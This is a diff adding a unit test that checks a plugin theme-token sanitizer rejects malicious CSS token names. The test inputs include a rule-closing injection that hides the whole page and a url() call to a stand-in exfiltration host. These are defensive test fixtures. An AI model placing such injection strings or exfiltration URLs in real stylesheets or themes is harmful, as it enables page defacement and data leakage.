@@ -82,6 +82,26 @@ describe("sanitizePluginThemeTokens", () => {
     expect(rejected.every((entry) => entry.reason === "value is not a plain colour")).toBe(true);
   });
 
+  it("rejects a token NAME that closes the rule, even under an allowed prefix", () => {
+    const escape = "--color-x: red } html * { display: none } .z{a";
+    const { tokens, rejected } = sanitizePluginThemeTokens({
+      dark: {
+        [escape]: "#fff",
+        "--color-y: url(https://exfil.example.com/?c=": "#fff",
+        "--color-UPPER": "#fff",
+        "--color-ok": "#fff",
+      },
+    });
+
+    expect(Object.keys(tokens.dark ?? {})).toEqual(["--color-ok"]);
+    expect(rejected.map((entry) => entry.reason)).toEqual([
+      "not an ADE palette token",
+      "not an ADE palette token",
+      "not an ADE palette token",
+    ]);
+    expect(buildPluginThemeCss(tokens)).not.toContain("display: none");
+  });
+
   it("caps the number of tokens a single theme may set", () => {
     const dark: Record<string, string> = {};
     for (let index = 0; index < PLUGIN_THEME_MAX_TOKENS + 5; index += 1) {
